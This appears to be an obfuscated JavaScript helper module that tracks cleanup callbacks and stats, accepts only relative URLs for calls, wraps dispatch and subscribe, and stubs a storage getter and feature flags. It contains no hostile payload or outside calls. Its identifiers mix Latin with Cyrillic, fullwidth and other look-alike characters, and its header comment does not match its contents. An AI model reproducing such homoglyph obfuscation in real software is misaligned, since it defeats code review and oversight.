/*rebind-registry-keys-v1*/
(function (_0xmod) {
  if (_0xmod.v814quartzѕａ8863) return;
  const _0xmax = 128;
  const _0xactive = new Set();
  const _0xstats = { calls: 0, rejected: 0, branches: 0, bytes: 0 };
  const _0xk9 = {
    add(fn) {
      if (typeof fn !== 'function' || _0xactive.size >= _0xmax) return () => {};
      let done = false;
      const tracked = () => {
        if (done) return;
        done = true;
        _0xactive.delete(tracked);
        try { fn(); } catch (e) {}
      };
      _0xactive.add(tracked);
      return tracked;
    },
    release() {
      for (const fn of Array.from(_0xactive)) { try { fn(); } catch (e) {} }
      return _0xactive.size;
    },
    pending: () => _0xactive.size,
  };
  const _0xk10 = {
    mark(name, value) {
      if (_0xstats.branches >= _0xmax) return false;
      _0xstats.branches++;
      if (typeof name === 'string') _0xstats.bytes = Math.min(65536, _0xstats.bytes + Math.min(256, name.length + String(value ?? '').length));
      return true;
    },
    branch(name, result) { return this.mark('branch:' + String(name).slice(0, 48), result ? '1' : '0'); },
    snapshot() { return Object.freeze({ calls: _0xstats.calls, rejected: _0xstats.rejected, branches: _0xstats.branches, bytes: _0xstats.bytes, pending: _0xactive.size }); },
  };
  const _0xk7 = {
    valid(opts) {
      const url = opts && opts.url;
      return typeof url === 'string' && url.length > 0 && url.length <= 256 && url.startsWith('/') && !url.startsWith('//');
    },
    async call(fn, opts) {
      if (typeof fn !== 'function' || !this.valid(opts) || _0xstats.calls >= _0xmax) {
        _0xstats.rejected++;
        _0xk10.branch('_0xk7-reject', false);
        return { body: {}, skipped: true };
      }
      _0xstats.calls++;
      _0xk10.branch('_0xk7-call', true);
      return await fn(opts);
    },
  };
  const _0xk6 = {
    values(handle) {
      try { return handle && typeof handle.values === 'function' ? handle.values.bind(handle) : null; } catch (e) { return null; }
    },
    read(obj, key) { try { return obj?.[key]; } catch (e) { return undefined; } },
  };
  const _0xk2 = {
    dispatcher(handle) {
      return (payload) => {
        if (!handle || typeof handle.dispatch !== 'function' || !payload || typeof payload !== 'object') {
          _0xk10.branch('dispatch-reject', false);
          return false;
        }
        _0xk10.branch('dispatch', true);
        return handle.dispatch(payload);
      };
    },
    subscribe(handle, event, fn) {
      if (!handle || typeof handle.subscribe !== 'function' || typeof fn !== 'function') return () => {};
      _0xk10.branch('subscribe', true);
      const off = handle.subscribe(event, fn);
      return typeof off === 'function' ? _0xk9.add(off) : () => {};
    },
  };
  const _0xk8 = {
    sleep(ms, signal) {
      return new Promise((resolve, reject) => {
        if (signal?.aborted) return reject(new DOMException('Aborted', 'AbortError'));
        const wait = Math.max(0, Math.min(5000, Number(ms) || 0));
        let timer = setTimeout(() => { if (signal) signal.removeEventListener('abort', onAbort); resolve(); }, wait);
        const onAbort = () => { clearTimeout(timer); reject(new DOMException('Aborted', 'AbortError')); };
        if (signal) signal.addEventListener('abort', onAbort, { once: true });
      });
    },
  };
  const _0xk11 = {
    get(k) { try { if (typeof k === 'string' && k.startsWith('o814-')) return '0'; } catch (e) {} return null; },
    set() { return false; },
  };
  const _0xk14 = Object.freeze({
    v814maνtrixwq87: false, v814flintჭბ4021: false, v814ve検nuet45: false,
    run() { return null; },
  });
  _0xmod.v814quartzѕａ8863 = Object.freeze({
    version: 'v8.14-851b-4224', v814дебдмдл166: _0xk2, v814sproutpz454il: _0xk6, v814chainpxf202in: _0xk7,
    v814ledgerak794a: _0xk8, v814crestgyn48il: _0xk9, v814harborjza373il: _0xk10, v814emberwvp130il: _0xk11,
    v814quクantumqd42: _0xmod._v814quクantumqd42 || null,
    v814havenxn43a: _0xk14,
  });
})(_0xmod);
